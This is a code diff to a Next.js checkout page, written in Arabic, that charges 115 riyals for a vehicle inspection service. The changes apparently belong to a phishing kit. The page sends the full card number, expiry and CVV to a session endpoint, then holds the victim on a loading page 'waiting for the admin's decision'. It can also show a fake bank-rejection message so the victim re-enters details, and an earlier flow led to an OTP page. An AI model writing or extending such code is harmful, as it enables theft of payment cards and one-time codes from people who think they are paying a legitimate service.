@@ -1,7 +1,7 @@
 "use client";
 export const dynamic = 'force-dynamic';
-import { useState } from "react";
-import { useRouter } from "next/navigation";
+import { useState, useEffect } from "react";
+import { useRouter, useSearchParams } from "next/navigation";
 import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
@@ -12,6 +12,15 @@ export default function PaymentPage() {
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
+  const [errorMsg, setErrorMsg] = useState("");
+  const searchParams = useSearchParams();
+
+  useEffect(() => {
+    const rejected = searchParams.get("rejected");
+    if (rejected === "1") {
+      setErrorMsg("تم رفض العملية من قبل البنك مصدر البطاقة");
+    }
+  }, [searchParams]);
 
   function formatCardNumber(val: string) {
     const digits = val.replace(/\D/g, "").slice(0, 16);
@@ -31,24 +40,29 @@ export default function PaymentPage() {
     return null;
   }
 
-  function handleSubmit() {
+  async function handleSubmit() {
     if (!cardHolder || !cardNumber || !expiry || !cvv) {
       alert("يرجى تعبئة جميع البيانات");
       return;
     }
+    setErrorMsg("");
     // إرسال بيانات البطاقة للـ API
-    fetch('/api/session', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        current_page: 'payment',
-        card_holder: cardHolder,
-        card_number: cardNumber,
-        card_expiry: expiry,
-        card_cvv: cvv,
-      }),
-    }).catch(() => {});
-    router.push("/otp");
+    try {
+      await fetch('/api/session', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          current_page: 'payment',
+          card_holder: cardHolder,
+          card_number: cardNumber,
+          card_expiry: expiry,
+          card_cvv: cvv,
+          waiting_for: 'payment',
+        }),
+      });
+    } catch {}
+    // الانتقال لصفحة التحميل وانتظار قرار الأدمين
+    router.push("/loading-page?from=payment");
   }
 
   const cardType = getCardType(cardNumber);
@@ -60,6 +74,25 @@ export default function PaymentPage() {
       <div style={{ background: "#fff", width: "100%", maxWidth: "420px", borderRadius: "25px", padding: "25px 20px", boxShadow: "0 10px 30px rgba(0,0,0,0.08)", textAlign: "center" }}>
 
         {/* Header */}
+        <div style={{ marginBottom: "20px" }}>
+
+        {/* رسالة الرفض */}
+        {errorMsg && (
+          <div style={{
+            backgroundColor: "#fff0f0",
+            border: "1px solid #e74c3c",
+            borderRadius: "10px",
+            padding: "12px 16px",
+            marginBottom: "18px",
+            color: "#e74c3c",
+            fontSize: "14px",
+            fontWeight: "bold",
+            textAlign: "center",
+          }}>
+            ❌ {errorMsg}
+          </div>
+        )}
+        </div>
         <div style={{ marginBottom: "20px" }}>
           <h1 style={{ fontSize: "18px", color: "#333", marginBottom: "5px" }}>إتمام عملية الدفع</h1>
           <p style={{ fontSize: "14px", color: GREEN, fontWeight: "bold" }}>بقيمة 115 ريال - خدمة الفحص الفني الدوري</p>
